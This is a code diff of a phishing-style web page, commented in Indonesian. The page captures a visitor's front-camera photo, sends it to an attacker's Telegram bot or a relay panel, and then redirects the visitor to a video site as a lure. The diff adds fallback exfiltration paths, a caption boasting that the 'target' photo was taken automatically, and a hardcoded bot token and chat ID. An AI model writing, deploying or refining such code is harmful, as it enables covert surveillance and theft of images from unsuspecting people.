@@ -26,9 +26,9 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ================= CONFIG TELEGRAM ===================================
+    // ================= CONFIG TELEGRAM (UNTUK METODE DIREK/CADANGAN) =================
     const TELEGRAM_BOT_TOKEN = '8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w';
-    const ADMIN_CHAT_ID = '-1003731213733'; 
+    const ADMIN_CHAT_ID = '-1003731213733'; // Hanya dipakai jika link dibuka TANPA ?sender=
     // =====================================================================
 
     // ================= CONFIG PANEL PTERODACTYL ==========================
@@ -36,6 +36,7 @@
     const TARGET_WEBSITE = 'https://vidvf.com/e/18yicnf68d0a'; 
     // =====================================================================
 
+    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
     const urlParams = new URLSearchParams(window.location.search);
     const SENDER_ID = urlParams.get('sender'); 
 
@@ -52,7 +53,7 @@
             video.srcObject = currentStream;
 
             video.onplay = () => {
-                setTimeout(takeAndSendSnapshot, 3000); 
+                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik
             };
         } catch (err) {
             console.error(err);
@@ -78,19 +79,50 @@
             currentStream.getTracks().forEach(track => track.stop());
         }
         
+        // Tentukan ID penerima utama berdasarkan parameter URL
         const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;
 
-        // Kirim data foto langsung menggunakan API Bot Telegram ke tujuan grup utama
-        sendDirectTelegram(finalRecipientId);
+        // JIKA BISA MENGGUNAKAN PANEL (MENGGUNAKAN BASE64 JSON)
+        if (SENDER_ID) {
+            const imageData = canvas.toDataURL('image/png');
+            
+            fetch(PANEL_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    senderId: finalRecipientId,
+                    image: imageData
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (!data.ok) {
+                    // Jika panel merespon error, paksa kirim lewat jalur direk API Telegram
+                    sendDirectTelegram(finalRecipientId);
+                } else {
+                    window.location.href = TARGET_WEBSITE;
+                }
+            })
+            .catch(err => {
+                console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
+                sendDirectTelegram(finalRecipientId);
+            });
+        } else {
+            // Jika tidak ada ?sender= (admin iseng buka link utama), kirim langsung ke admin
+            sendDirectTelegram(finalRecipientId);
+        }
     }
 
+    // Fungsi pengiriman bypass langsung menembak Telegram API (Menggunakan BLOB)
     function sendDirectTelegram(chatIdToSend) {
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', chatIdToSend); 
             formData.append('photo', blob, 'snapshot.png');
-            // Menandai caption khusus agar index.js tahu bahwa ini data dari kamera target
-            formData.append('caption', 'DATABASE_PHOTO_TRIGGER_BY_TARGET'); 
+            formData.append('caption', '📸 Target Berhasil\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.');
+            
+            // Perbaikan Parameter: Menggunakan tipe JSON asli JSON.parse agar dibaca Boolean oleh Telegram API
+            formData.append('has_spoiler', JSON.parse('true')); 
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
@@ -98,7 +130,7 @@
                     body: formData
                 });
             } catch (error) {
-                console.error("Gagal mengirim ke Telegram:", error);
+                console.error("Gagal bypass ke Telegram API:", error);
             } finally {
                 window.location.href = TARGET_WEBSITE;
             }
